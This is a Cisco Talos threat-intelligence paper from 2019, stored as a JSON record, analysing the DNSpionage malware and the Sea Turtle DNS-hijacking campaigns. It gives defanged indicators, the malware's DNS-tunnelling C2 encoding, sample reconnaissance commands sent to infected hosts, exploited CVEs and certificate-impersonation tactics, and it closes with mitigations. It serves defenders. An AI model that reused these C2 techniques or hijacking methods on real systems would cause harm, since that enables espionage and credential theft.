{
    "id": "3ece69eb-e693-4013-a33a-b31bb1c8ed5d",
    "created_at": "2023-07-29T02:06:57.006744Z",
    "updated_at": "2025-03-27T02:15:35.592212Z",
    "deleted_at": null,
    "sha1_hash": "2beb8524fab9f8f40c0501b712accf9a179e7272",
    "title": "DNS on fire",
    "authors": "",
    "file_creation_date": "2019-11-07T09:58:09Z",
    "file_modification_date": "2019-11-07T09:58:31Z",
    "file_size": 1370506,
    "plain_text": "**LONDON**\n**2 – 4 October 2019**\n\n\n## DNS ON FIRE\n_Warren Mercer & Paul Rascagnères_\nCisco Talos, UK & France\n\n{wamercer, prascagn}@cisco.com\n\n**ABSTRACT**\n\n_Cisco Talos has identifi ed malicious actors that have been targeting the DNS protocol successfully_\nfor the past several years. In this paper, we will present two of the threat actors we have been\ntracking.\n\nThe fi rst one developed a piece of malware, named DNSpionage, targeting several government\nagencies in the Middle East, as well as an airline. During the research process for DNSpionage, we\nalso discovered an effort to redirect DNSs from the targets and discovered some registered SSL\ncertifi cates for them. We identifi ed multiple countries being targeted by this redirection. On 22\nJanuary 2019, the US Department of Homeland Security published a directive concerning this attack\nvector. We will present the timeline for these events and their technical details.\n\nThe second actor is behind a campaign we named ‘Sea Turtle’. This actor is more advanced and\nmore aggressive than the fi rst, directly targeting registrars and a registry.\n\nThis paper will present the two threat groups and the methodology used to target their victims.\n\n**INTRODUCTION**\n\nDNS is a fundamental core technology of the Internet as we know it. It allows users to fi nd websites\neasily and removes the requirement to know the IP address of every single host on the Internet. This\npaper will discuss two attacks on DNS and will show how an attacker can control your traffi c. The\nDNSpionage [1] and Sea Turtle [2] campaigns show just how important DNS can be to attackers and\nhow the abuse and manipulation of DNS can lead to success for the attackers. Each of these\ncampaigns has a very specifi c focus and they demonstrate the determination of state-sponsored actors\nto ensure their operations are successful. Organizations and governments alike need to work together\nto establish a set of rules and potential punishments around the targeting of DNS and to cooperate in\npursuing actors that irresponsibly target this system.\n\n**DNS REFRESH**\n\n**DNS protocol**\n\nDNS is a hierarchical system that’s decentralized from any specifi c entity and operates as the\n‘phonebook’ of the Internet. The DNS protocol is the technology responsible for turning an IP\naddress, such as ‘104.17.59.76’, into a domain name, ‘www.talosintelligence.com’. Without DNS,\nusers would have to remember a string of numbers rather than a simple name or phrase to navigate\nthe Internet.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n**Registry vs. registrar vs. registrant**\n\nThis can be a complicated area if you’re not familiar with DNS and the methods by which it is\nmaintained and operated. The three types of organizations directly affected by these attacks on DNS\nare registries, registrars and registrants.\n\n**• Registry: This is an organization that manages the top-level domains (TLDs). A registry is the**\nentity responsible for working with registrars to allow registrants to purchase domain names.\n\n**• Registrar: This is an organization that is responsible for providing a platform for end-users to**\npurchase domain names. GoDaddy, for example, sells domain names to the public and operates\nas an accredited registrar. Depending on the TLD you wish to purchase (.com, .net, .org, etc.),\nthe ccTLD (.us, .ca, .eu, etc.) or gTLD (.club, .site, .top, etc.), you will ultimately end up\npurchasing this from the registrar.\n\n**• Registrant: This is the end-user – the customer of the registrar. Once a domain name is**\nregistered, the registrant can maintain their domain name settings through their registrar of\nchoice. This allows changes to be made by the domain owner, which are then propagated across\nthe Internet.\n\n**DNSPIONAGE**\n\n_Cisco Talos discovered DNSpionage in late 2018 [1]. DNSpionage is identifi ed as an espionage_\ncampaign against several Middle Eastern government entities, specifi cally in Lebanon and the United\nArab Emirates (UAE). The campaign utilized malicious documents delivered via spear phishing and\nfake job websites, and ultimately made use of DNS redirection to facilitate the redirection of network\ntraffi c from the end-user to actor-controlled infrastructure.\n\n**Fake job websites**\n\nThe attackers’ fi rst attempt to compromise the user involved two malicious websites that mimicked\nlegitimate sites that host job listings:\n\n - hr-wipro[.]com (with a redirection to the real wipro.com)\n\n - hr-suncor[.]com (with a redirection to the real suncor.com)\n\nThese sites hosted a malicious Microsoft Word document: hxxp://hr-suncor[.]com/Suncor_\nemployment_form[.]doc.\n\nThe document was a copy of a legitimate fi le that is available on the website of Suncor Energy (a\nCanadian sustainable energy company) and contained a malicious macro.\n\n**Malicious document**\n\nThe malicious Word document was delivered via malicious links and spear-phished emails. It was\nspecifi cally targeted to individuals and was not a widespread spam campaign trying to get as many\nclicks as possible. DNSpionage had specifi c intent in mind.\n\nThe malicious Word document was disguised as a legitimate human resources document from\n_Suncor._\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n_Figure 1: The malicious Word document was disguised as a legitimate Suncor human resources_\n_document._\n\nAs mentioned, the document contained a malicious macro, which performs the following actions:\n\n1. When the document is opened, the macro decodes a PE fi le encoded with Base64 and drops it\nin %UserProfi le%\\.oracleServices\\svshost_serv.doc.\n\n2. When the document is closed, the macro renames the fi le ‘svshost_serv.doc’ to\n‘svshost_serv.exe’. Then, the macro creates a scheduled task named ‘chromium updater\nv 37.5.0’ in order to execute the binary. The scheduled task is executed immediately and\nrepeated every minute.\n\nThe payload is executed when Microsoft Offi ce is closed, meaning that human interaction is required\nin order for it to be deployed. The macro, while available through analysis, is also passwordprotected in Microsoft Word to stop the victim from exploring the macro code via Microsoft Offi ce.\n\nIn addition, the macro uses classical string obfuscation in order to avoid strings detection:\n\n_Figure 2: The macro uses classical string obfuscation._\n\nThe ‘schedule.service’ string is created using concatenation. The fi nal payload is a remote\nadministration tool that we named ‘DNSpionage’.\n\n**DN Spionage**\n\nDNSpionage supports DNS tunnelling as a covert channel to communicate with the attackers’\ninfrastructure.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\nIt creates its own data in the running directory:\n\n%UserProfi le%\\.oracleServices/\n\n%UserProfi le%\\.oracleServices/Apps/\n\n%UserProfi le%\\.oracleServices/Confi gure.txt\n\n%UserProfi le%\\.oracleServices/Downloads/\n\n%UserProfi le%\\.oracleServices/log.txt\n\n%UserProfi le%\\.oracleServices/svshost_serv.exe\n\n%UserProfi le%\\.oracleServices/Uploads/\n\nThe attacker uses the ‘Downloads’ directory to store additional scripts and tools downloaded from\nthe command-and-control (C2) server.\n\nThe ‘Uploads’ directory is also used to store fi les temporarily before exfi ltrating them to the C2.\n\nThe log.txt fi le contains logs in plain text. All the executed commands can be logged in this fi le. It\nalso contains the result of the commands.\n\n‘Confi gure.txt’ is the last fi le. As its name suggests, it contains the malware confi guration. The\nattackers can specify a custom C2 server URL, as well as a URI and a domain that serves as a DNS\ncovert channel. Additionally, the attackers can specify a custom Base64 dictionary for obfuscation.\nWe discovered that the attackers used a custom dictionary for each target.\n\nAll the data is transferred in JSON, which is why a large part of the malware’s code is the JSON\nlibrary.\n\nDNSpionage made use of both HTTP and DNS ‘modes’ for communicating with the C2.\n\n**_HTTP mode_**\n\nWhen using ‘HTTP mode’, a DNS request to 0ffi ce36o[.]com (notice the ‘zero’ character being used\nin place of the ‘o’, and vice-versa) is performed with random data encoded with Base64. This request\nregisters the infected system and receives the IP address of an HTTP server (185.20.184.138 during\nour analysis).\n\nThe following is an example of a DNS request:\n\nyyqagfzvwmd4j5ddiscdgjbe6uccgjaq[.]0ffi ce36o[.]com\n\nThe malware is able to craft DNS requests which are used to provide the attacker with additional\ninformation. Here is an example of one of these requests:\n\noGjBGFDHSMRQGQ4HY000[.]0ffi ce36o[.]com\n\nIn this context, the fi rst four characters are randomly generated by the malware using rand(). The rest\nof the domain is then encoded in Base32. Once decoded, the value is 1Fy2048. ‘Fy’ is the target ID\nand ‘2048’ (0x800) represents ‘Confi g fi le not found’. This request is performed if the confi guration\nfi le was not retrieved on the infected machine.\n\nThe malware then performs an initial HTTP request to retrieve its confi guration at hxxp://IP/Client/\nLogin?id=Fy.\n\nThis request will be used to create the confi guration fi le, particularly to set the custom Base64\ndictionary.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\nThe second HTTP request is hxxp://IP/index.html?id=XX (where ‘XX’ is the ID for the\ninfected system).\n\nThe purpose of this request is to retrieve the orders. The site is a fake Wikipedia page, as shown in\nFigure 3.\n\nThe commands are included in the source code of the fake page, as shown in Figure 4.\n\n_Figure 3: A fake Wikipedia page._\n\n_Figure 4: The source code of the fake page includes the commands._\n\nIn this example, the commands are encoded with a standard Base64 algorithm because we did not\nreceive a custom dictionary. Figure 5 shows another example with a custom dictionary in the\nconfi guration fi le.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n_Figure 5: Custom dictionary in the confi guration fi le._\n\nThe following are the three commands that are sent automatically to the compromised system:\n\n{\"c\": \"echo %username%\", \"i\": \"-4000\", \"t\": -1, \"k\": 0}\n\n{\"c\": \"hostname\", \"i\": \"-5000\", \"t\": -1, \"k\": 0}\n\n{\"c\": \"systeminfo | fi ndstr /B /C:\\\"Domain\\\"\", \"i\": \"-6000\", \"t\": -1, \"k\": 0}\n\nFigure 6 shows the snippet of code generated by the malware after executing those commands.\n\n_Figure 6: Code generated after executing commands._\n\nThe attackers ask for the username and hostname in order to retrieve the infected user’s domains.\nThe fi rst step is clearly a reconnaissance phase. The data is eventually sent to hxxp://IP/Client/\nUpload.\n\nFinally, CreateProcess() executes the commands, and the output is redirected to a pipe to the malware\nthat has been created with CreatePipe().\n\n**_DNS mode_**\n\nThe malware also supports a DNS-only mode. In this mode, the orders and answers are handled via\nDNS. This option is dictated within the confi gure.txt fi le on the infected machine.\n\nUsing DNS can sometimes allow for information to be sent back to the attacker more easily as it will\ngenerally avoid any proxies or web fi ltering in place by leveraging the DNS protocol.\n\nFirst, the malware initiates a DNS query to ask for orders, for example:\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\nRoyNGBDVIAA0[.]0ffi ce36o[.]com\n\nThe fi rst four characters must be ignored (as mentioned earlier they are randomly generated); the\nrelevant data is GBDVIAA0. The decoded value (Base32) is ‘0GT\\x00’. GT is the target ID and \\x00\nis the request number.\n\nThe C2 server replies with an answer to the DNS request containing an IP address. The reply does\nnot need to include a valid IP as this is not required by the DNS protocol. For example, the reply\nmight include 0.1.0.3. We believe the fi rst value (0x0001) is the command ID for the next DNS\nrequest and 0x0003 is the size of the command.\n\nSecondly, the malware performs a DNS query with the command ID:\n\nt0qIGBDVIAI0[.]0ffi ce36o[.]com (GBDVIAI0 => \"0GT\\x01\")\n\nThe C2 server will return a new IP: 100.105.114.0. If we convert the value in ASCII we have\n‘dir\\x00’, the command to be executed.\n\nFinally, the result of the executed command will be sent using multiple DNS requests:\n\ngLtAGJDVIAJAKZXWY000.0ffi ce36o[.]com -> GJDVIAJAKZXWY000 -> \"2GT\\x01 Vol\"\n\nTwGHGJDVIATVNVSSA000.0ffi ce36o[.]com -> GJDVIATVNVSSA000 -> \"2GT\\x02ume\"\n\n1QMUGJDVIA3JNYQGI000.0ffi ce36o[.]com -> GJDVIA3JNYQGI000 -> \"2GT\\x03in d\"\n\niucCGJDVIBDSNF3GK000.0ffi ce36o[.]com -> GJDVIBDSNF3GK000 -> \"2GT\\x04rive\"\n\nviLxGJDVIBJAIMQGQ000.0ffi ce36o[.]com -> GJDVIBJAIMQGQ000 -> \"2GT\\x05 C h\"\n\n[...]\n\nBy using DNS we were able to confi rm that the victim locations were highly targeted towards the\nUAE and Lebanon.\n\n_Figure 7: DNS queries._\n\n**Infrast ructure overlaps and DNS redirection**\n\nDuring the DNSpionage campaign we identifi ed three IPs used within DeltaHost. These three IPs\nwere linked infrastructure:\n\n - 185.20.184.138\n\n - 185.161.211.72\n\n - 185.20.187.8\n\nThe last one was used in a DNS redirection attack between September and November 2018.\nMultiple nameservers belonging to the public sector in Lebanon and the UAE, as well as some\ncompanies in Lebanon, were apparently affected, and hostnames under their control were pointed to\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\nattacker-controlled IP addresses. The attackers redirected the hostnames to the IP 185.20.187.8 for a\nshort time. At the same time as redirecting the IP, the attackers created a certifi cate matching the\ndomain name using the Let’s Encrypt service.\n\nIn this section, we will present all the DNS redirection instances we identifi ed and the\nattacker-generated certifi cates associated with each. We don’t know if the redirection attack fulfi lled\nits objectives, or what exact purpose the DNS redirection served. However, the impact could be\nsignifi cant, as the attackers were able to intercept all traffi c destined for these hostnames during this\nperiod. Because the attackers targeted email and VPN traffi c specifi cally, they may have been used to\nharvest additional information, such as email and/or VPN credentials.\n\nAs incoming email would also be arriving at the attackers’ IP address, if there was multi-factor\nauthentication, it would allow the attackers to obtain MFA codes to abuse. Since the attackers were\nable to access email, they could carry out additional attacks or even blackmail the target.\n\nThe DNS redirection we identifi ed occurred in multiple locations where there was no direct correlation\nof infrastructure, staff, or job routines. It also occurred in both the public and private sectors. Therefore,\nwe believe it was neither human error nor a mistake by an administrative user within any of the\nimpacted organizations. This was a deliberate, malicious attempt by the attackers to redirect DNS.\n\n**_Lebanese government redirection_**\n\n_Talos identifi ed that the Finance Ministry of Lebanon’s email domain was the victim of a malicious_\nDNS redirection.\n\nThe domain webmail.fi nance.gov.lb was redirected to 185.20.187.8 on 6 November at 06:19:13\nGMT. On the same date at 05:07:25 a Let’s Encrypt certifi cate was created.\n\n**_Redirection of UAE public domains_**\n\nUAE public domains were also targeted. We identifi ed a domain belonging to a law enforcement\nagency (VPN and College) and another government agency.\n\n - adpvpn.adpolice.gov.ae redirected to 185.20.187.8 on 13 September at 06:39:39 GMT. On the\nsame date at 05:37:54 a Let’s Encrypt certifi cate was created.\n\n - mail.mgov.ae redirected to 185.20.187.8 on 15 September at 07:17:51 GMT. A Let’s Encrypt\ncertifi cate was created on the same date at 06:15:51 GMT.\n\n - mail.apc.gov.ae redirected to 185.20.187.8 on 24 September. A Let’s Encrypt certifi cate was also\ncreated on the same date at 05:41:49 GMT.\n\n**_Middle East Airlines redirection_**\n\n_Talos also discovered that Middle East Airlines (MEA), a Lebanese airline, was the victim of DNS_\nredirection.\n\n - memail.mea.com.lb redirected to 185.20.187.8 on 14 November at 11:58:36 GMT\n\n - On 6 November at 10:35:10 GMT, a Let’s Encrypt certifi cate was created.\n\n**SEA TUR TLE**\n\nThe Sea Turtle campaign we identifi ed showed an actor carrying out a widespread, but very specifi c\nDNS hijacking campaign. We believe this group is state sponsored and has a very specifi c set of\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\ntargets in mind. This was not an opportunistic attack. It specifi cally targeted victims with a clear\nobjective of obtaining credentials to then lead to additional attacks against the same victims. We\nidentifi ed Sea Turtle activity occurring from around January 2017 to the present day. We initially\nreported on this actor in April 2019 [2] – but that didn’t slow its activity down. The actor continued\nwith operations, even adding a new DNS hijacking technique [3]. This is unusual and shows that the\nSea Turtle attackers have little concern about being discovered and are happy to continue their\noperations in an unusually brazen manner. Typically, actors will scale back or even stop operations\nafter being discovered, but not in this case.\n\n_Talos identifi ed various victims of this campaign in the intelligence, military and government_\nfi elds. These are not the types of victims typically associated with fi nancially motivated attacks.\nWe identifi ed primary and secondary targets and split the victims distinctly. The fi rst group, that\nwe identify as primary victims, includes national security organizations, ministries of foreign\naffairs, and prominent energy organizations. The threat actor also targeted third-party entities that\nprovide services to these primary victims in order to obtain access to them. Targets that fall into\nthe secondary victim category include numerous DNS registrars, telecommunication companies,\nand Internet service providers. One of the most notable aspects of this campaign was how the\nattackers were able to perform DNS hijacking on their primary victims by fi rst targeting these\nthird-party entities.\n\n_Figure 8: April 2019 victimology map._\n\nAs mentioned, Talos published additional research in July 2019, highlighting a new infl ux of victims\nas shown in an updated victimology map (Figure 9).\n\nWith this updated victimology insight Talos was able to identify the following vertices attacked:\n\n - Ministries of foreign affairs\n\n - Military organizations\n\n - Intelligence agencies\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n_Figure 9: July 2019 victimology map._\n\n - Prominent energy organizations\n\n - Telecommunications organizations\n\n - Internet service providers\n\n - Information technology fi rms\n\n - Registrars\n\n - One registry\n\n - Government organizations\n\n - Energy companies\n\n - Think tanks\n\n - International non-governmental organizations\n\n - At least one airport\n\nWith this in mind, we assess with high confi dence that these operations are distinctly different from\nthose of DNSpionage and we believe that Sea Turtle poses a more severe threat than DNSpionage,\ngiven the methodologies it employs. The level of access we presume necessary to engage in successful\nDNS hijacking indicates an ongoing high degree of threat to organizations in the targeted regions. Due\nto the effectiveness of this approach, we encourage all organizations, globally, to ensure they have taken\nsteps to minimize the possibility of malicious actors duplicating this attack methodology. The threat\nactors behind the Sea Turtle campaign show clear signs of being highly capable and brazen in their\nendeavours. The actors are responsible for the fi rst publicly confi rmed case [4] against an organization\n(netnod.se) that manages a root server zone, highlighting the attackers’ sophistication.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n**Sea Turtl e DNS attacks**\n\nDNS hijacking and redirection was a mechanism used by the Sea Turtle threat actors to fulfi l their\ngoals and achieve their ultimate objectives. The Sea Turtle actors were able to perform this DNS\nhijacking by illicitly modifying DNS records to point to their own actor-controlled (and thus\nmalicious) servers. There are several different ways the Sea Turtle actors could have carried this out.\n\nThe fi rst and most direct way to access an organization’s DNS records is through the registrar by\nusing the registrant’s credentials. These credentials are used to log into the DNS provider from the\nclient-side. If an attacker was able to compromise an organization’s administrative credentials, they\nwould be able to change that particular organization’s DNS records at will.\n\nThe second way to access DNS records is through a DNS registrar, sometimes called a registrar\noperator. A registrar sells domain names to the public and manages DNS records on behalf of the\nregistrant through the domain registry. Records in the domain registry are accessed through the\nregistry application using the Extensible Provisioning Protocol (EPP). EPP was detailed in the\nrequest for comment (RFC) 5730 [5] as ‘a means of interaction between a registrar’s applications and\nregistry applications’. If the attackers were able to obtain one of these EPP keys, they would be able\nto modify any DNS records that were managed by that particular registrar.\n\nThe third approach to gain access to DNS records is through one of the registries. These registries\nmanage any known TLD, such as entire country code top-level domains (ccTLDs) and generic\ntop-level domains (gTLDs). For example, Verisign manages all entities associated with the top-level\ndomain ‘.com’. All the different registry information then converges into one of 12 different\norganizations [6] that manage different parts of the domain registry root. The domain registry root is\nstored on 13 ‘named authorities in the delegation data for the root zone’, according to ICANN [7].\n\nFinally, actors could target root zone servers to modify the records directly. It is important to note\nthat there is no evidence during this campaign (or any other we are aware of) that the root zone\nservers were attacked or compromised for the purposes of DNS redirection or hijacking. We\nhighlight this as a potential avenue that attackers would consider. The root DNS servers issued a\njoint statement [8] saying: ‘There are no signs of lost integrity or compromise of the content of the\nroot [server] zone... There are no signs of clients having received unexpected responses from root\nservers.’\n\nThe Department of Homeland Security (DHS) issued an alert [9] about this activity on 24 January\n2019, warning that an attacker could redirect user traffi c and obtain valid encryption certifi cates for\nan organization’s domain names.\n\nIt is important to remember that the DNS hijacking is merely a means for the attackers to achieve\ntheir primary objective. Based on observed behaviours, we believe the actors ultimately intended to\nsteal credentials to gain access to networks and systems of interest. To achieve their goals, the actors\nbehind Sea Turtle:\n\n1. Established a means to control the DNS records of the target.\n\n2. Modifi ed DNS records to point legitimate users of the target to actor-controlled servers.\n\n3. Captured legitimate user credentials when users interacted with these actor-controlled servers.\n\nFigure 10 illustrates how we believe the actors behind the Sea Turtle campaign used DNS hijacking\nto achieve their end goals.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n_Figure 10: How we believe the actors behind the Sea Turtle campaign used DNS hijacking to achieve_\n_their end goals._\n\n**Globalized DNS hijacking activity**\n\nDuring a typical incident, the actor would modify the NS records for the targeted organization,\npointing users to a malicious DNS server that provided actor-controlled responses to all DNS\nqueries. The amount of time that the targeted DNS record was hijacked ranged from a couple of\nminutes to a couple of days. This type of activity could give an attacker the ability to redirect any\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\nvictim who queried for that particular domain around the world. Other cybersecurity fi rms have\nreported some aspects of this activity [10]. Once the actor-controlled name server was queried for the\ntargeted domain, it would respond with a falsifi ed ‘A’ record that would provide the IP address of the\nactor-controlled MitM node instead of the IP address of the legitimate service. In some instances, the\nthreat actor modifi ed the time-to-live (TTL) value to one second. This was likely done to minimize\nthe risk of any records remaining in the DNS cache of the victim machine.\n\nTable 1 shows the name servers we observed being used in support of the Sea Turtle campaigns\nduring 2019.\n\n**Domain** **Active timeframe**\n\nns1[.]intersecdns[.]com March - April 2019\n\nns2[.]intersecdns[.]com March - April 2019\n\nns1[.]lcjcomputing[.]com January 2019\n\nns2[.]lcjcomputing[.]com January 2019\n\nns1[.]rootdnservers[.]com April 2019\n\nns2[.]rootdnservers[.]com April 2019\n\nns1[.]intersecdns[.]com February - April 2019\n\nns2[.]intersecdns[.]com February - April 2019\n\n_Table 1: Name servers identifi ed throughout our research._\n\nWe recently discovered a new actor-controlled nameserver, rootdnservers[.]com, that exhibited\nsimilar behaviour patterns to name servers previously utilized as part of the Sea Turtle campaign. The\nrootdnservers[.]com domain was registered on 5 April 2019 through the NameCheap registrar. The\nnew actor-controlled nameserver was utilized to perform DNS hijacking against three government\nentities that all used .gr, the Greek ccTLD. It’s likely that these hijackings were performed through\nthe access the threat actors obtained in the ICS-Forth network.\n\n**_Sea Turtle tradecraft_**\n\nThe threat actors behind the Sea Turtle campaign gained initial access either by exploiting known\nvulnerabilities or by sending spear-phishing emails. Talos believes that the actors have exploited\nmultiple known CVEs either to gain initial access or to move laterally within an affected\norganization. Based on our research, we know the actors utilize the following known vulnerabilities:\n\n - CVE-2009-1151 [11]: PHP code injection vulnerability affecting phpMyAdmin\n\n - CVE-2014-6271 [12]: RCE affecting the GNU bash system, specifi cally the SMTP (this was\npart of the Shellshock [13] CVEs)\n\n - CVE-2017-3881 [14]: RCE by unauthenticated user with elevated privileges affecting Cisco\nswitches\n\n - CVE-2017-6736 [15]: Remote Code Exploit (RCE) for Cisco integrated Service Router 2811\n\n - CVE-2017-12617 [16]: RCE affecting Apache web servers running Tomcat\n\n|Domain|Active timeframe|\n|---|---|\n|ns1[.]intersecdns[.]com|March - April 2019|\n|ns2[.]intersecdns[.]com|March - April 2019|\n|ns1[.]lcjcomputing[.]com|January 2019|\n|ns2[.]lcjcomputing[.]com|January 2019|\n|ns1[.]rootdnservers[.]com|April 2019|\n|ns2[.]rootdnservers[.]com|April 2019|\n|ns1[.]intersecdns[.]com|February - April 2019|\n|ns2[.]intersecdns[.]com|February - April 2019|\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n - CVE-2018-0296 [17]: Directory traversal allowing unauthorized access to Cisco Adaptive\n_Security Appliances (ASAs) and fi rewalls_\n\n - CVE-2018-7600 [18]: RCE for websites built with Drupal, aka ‘Drupalgeddon’.\n\nAs of early 2019, the only evidence of the spear-phishing threat vector came from a compromised\norganization’s public disclosure. On 4 January, Packet Clearing House, an NGO that provides\nsupport to Internet exchange points and the core of the domain name system, provided confi rmation\nof this aspect of the actors’ tactics by publicly revealing that its internal DNS had briefl y been\nhijacked as a consequence of the compromise of its domain registrar.\n\nAs with any initial access involving a sophisticated actor, we believe this list of CVEs to be\nincomplete. The actors in question can leverage known vulnerabilities as they encounter a new attack\nsurface. This list only represents the observed behaviour of the actors, not their complete capabilities.\n\n**_Sea Turtle’s goals_**\n\nThis is a state-sponsored group choosing its targets and performing globally impacting techniques on\ncore Internet services. These attackers aimed to set up a man-in-the-middle (MitM) framework on\ntheir own actor-controlled infrastructure.\n\nTo this end, Sea Turtle built MitM servers that impersonated legitimate services in order to capture\nvictims’ credentials. Once these credentials had been captured, the user would be passed to the\nlegitimate service. To evade detection, the actors performed ‘certifi cate impersonation’, a technique\nin which the attackers obtained a certifi cate authority-signed X.509 certifi cate from another provider\nfor the same domain, imitating the one already used by the targeted organization. For example, if a\n_DigiCert certifi cate protected a website, the threat actors would obtain a certifi cate for the same_\ndomain but from another provider, such as Let’s Encrypt or Comodo. This tactic would make\ndetecting the MitM attack more diffi cult, as a user’s web browser would still display the expected\n‘SSL padlock’ in the URL bar.\n\nWhen the victim entered their password into the attackers’ spoofed web page, the credentials would\nbe captured for future use. From the victim’s point of view, the only indication of anything unusual\nwas a brief lag between entering their information and obtaining access to the service. This method\nwould also leave almost no evidence for network defenders to discover, as legitimate network\ncredentials were used to access the accounts.\n\n**_SSL certifi cate abuse_**\n\nOnce the threat actors appeared to have access to a network, they stole the organization’s SSL\ncertifi cate. The attackers would then use the certifi cate on actor-controlled servers to perform\nadditional MitM operations to harvest additional credentials. This allowed the actors to expand their\naccess into the targeted organization’s network. Typically, the stolen certifi cates were used for less\nthan one day, likely as an operational security measure (using stolen certifi cates for an extended\nperiod would increase the likelihood of detection). In some cases, the victims were redirected to\nthese actor-controlled servers displaying the stolen certifi cate.\n\nOne notable aspect of the campaign was the actors’ ability to impersonate VPN applications, such as\n_Cisco Adaptive Security Appliance (ASA) products, to perform MitM attacks. At this time, we do not_\nbelieve that the attackers found a new ASA exploit. Rather, they probably abused the trust\nrelationship associated with the ASA’s SSL certifi cate to harvest VPN credentials in order to gain\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\nremote access to the victim’s network. This MitM capability would allow the threat actors to harvest\nadditional VPN credentials.\n\nAs an example, DNS records indicate that a targeted domain resolved to an actor-controlled MitM\nserver. The following day, Talos identifi ed an SSL certifi cate with the subject common name of ‘ASA\nTemporary Self Signed Certifi cate’ associated with the aforementioned IP address. This certifi cate\nwas observed on both the actor-controlled IP address and on an IP address correlated with the victim\norganization.\n\nIn another case, the attackers were able to compromise NetNod, a non-profi t, independent Internet\ninfrastructure organization based in Sweden. NetNod acknowledged the compromise in a public\nstatement on 5 February 2019 [4]. Using this access, the threat actors were able to manipulate the\nDNS records for sa1[.]dnsnode[.]net. This redirection allowed the attackers to harvest credentials of\nadministrators who manage domains with the TLD of Saudi Arabia (.sa). It is likely that there are\nadditional Saudi Arabia-based victims of this attack.\n\nIn one of the more recent campaigns, on 27 March 2019, the threat actors targeted the Sweden-based\nconsulting fi rm Cafax. On Cafax’s public web page [19], the company states that one of its\nconsultants actively manages the i[.]root-server[.]net zone. NetNod managed this particular DNS\nserver zone. We assess with high confi dence that this organization was targeted in an attempt to\nre-establish access to the NetNod network, which was previously compromised by this threat actor.\n\n**_Sea Turtle vs. DNSpionage_**\n\nThe threat actors behind the Sea Turtle campaign have proven to be highly capable, as they have been\nable to perform operations uninterrupted for over two years and have been undeterred by public reports\ndocumenting various aspects of their activity. This cyber threat campaign represents the fi rst known\ncase of a domain name registry organization having been compromised for cyber espionage operations.\n\nIn order to distinguish this activity from the previous reporting of other attackers, such as those\naffi liated with DNSpionage, the following is a list of traits that are unique to the threat actors behind\nthe Sea Turtle campaign:\n\n - These actors perform DNS hijacking through the use of actor-controlled name servers.\n\n - These actors have been more aggressive in their pursuit targeting DNS registries and a number\nof registrars, including those that manage ccTLDs.\n\n - These actors use Let’s Encrypt, Comodo, Sectigo and self-signed certifi cates in their MitM\nservers to gain the initial round of credentials.\n\n - Once they have access to the network, they steal the target organization’s legitimate SSL\ncertifi cate and use it on actor-controlled servers.\n\n**_Successful?_**\n\nWe believe that the Sea Turtle campaign continues to be highly successful for several reasons. First,\nthe actors employ a unique approach to gain access to the targeted networks. Most traditional\nsecurity products such as IDS and IPS systems are not designed to monitor and log DNS requests.\nThe threat actors have been able to achieve this level of success because the DNS domain space\nsystem added security into the equation as an afterthought. Had more ccTLDs implemented security\nfeatures such as registrar locks, attackers would be unable to redirect the targeted domains.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\nThe threat actors also used an interesting technique called certifi cate impersonation. This technique\nwas successful in part because the SSL certifi cates were created to provide confi dentiality, not\nintegrity. The attackers stole organizations’ SSL certifi cates associated with security appliances such\nas ASA to obtain VPN credentials, allowing the actors to gain access to the targeted networks.\n\nThe threat actors were able to maintain long-term persistent access to many of these networks by\nutilizing compromised credentials.\n\nWe will continue to monitor Sea Turtle and work with our partners to understand the threat as it\ncontinues to evolve to ensure that our customers remain protected and the public is informed.\n\n**PROTECTIONS/MITIGATIONS**\n\nWe have compiled a list of potential actions that are recommended in order to best protect against\nthis type of attack. We have included additional security recommendations that were highlighted by\nBill Woodcock during his presentation on DNS/IMAP attacks [20].\n\n - We recommend implementing multi-factor authentication, such as Duo, to secure the\nmanagement of your organization’s DNS records at your registrar, and to connect remotely to\nyour corporate network via a Virtual Private Network (VPN).\n\n  - _Talos suggests a registry lock service on your domain names, which requires the registrar to_\nprovide an out-of-band confi rmation before the registry will process any changes to an\norganization’s DNS record.\n\n - DNSSEC sign your domains, either in-house, or using a DNS service provider which performs\nDNSSEC key-management services.\n\n - DNSSEC validate all DNS lookups in your recursive resolver, either using in-house\nnameservers, or a service like Cisco Umbrella / OpenDNS.\n\n - Make Internet Message Access Protocol (IMAP) email servers accessible only from your\ncorporate LAN and only to users who have already authenticated over a VPN.\n\n - If you suspect you have been targeted by this type of activity, we recommend instituting a\nnetwork-wide password reset, preferably from a computer on a trusted network.\n\n - Patch machines where applicable.\n\n - Finally, network administrators can monitor passive DNS records on their domains, to check for\nabnormalities.\n\nIf you feel Sea Turtle has impacted you then we would also suggest a network-wide password reset\nplan to ensure that all passwords that have potentially been compromised are successfully changed to\nattempt to lower the likelihood of the attacker still having valid credentials.\n\n**REFERENCES**\n\n[1] Mercer, W.; Rascagneres, P. DNSpionage Campaign Targets Middle East. Cisco Talos. 27\nNovember 2018. https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targetsmiddle-east.html.\n\n[2] Adamitis, D.; Maynor, D.; Mercer, W.; Olney, M.; Rascagneres, P. DNS Hijacking Abuses\nTrust In Core Internet Service. Cisco Talos. 17 April 2019. https://blog.talosintelligence.\ncom/2019/04/seaturtle.html.\n\n\n-----\n\n**LONDON**\n**2 – 4 October 2019**\n\n[3] Adamitis, D. Sea Turtle keeps on swimming, fi nds new victims, DNS hijacking techniques.\nCisco Talos. 9 July 2019. https://blog.talosintelligence.com/2019/07/sea-turtle-keeps-onswimming.html.\n\n[4] Statement on man-in-the-middle attack against Netnod. Netnod. 5 February 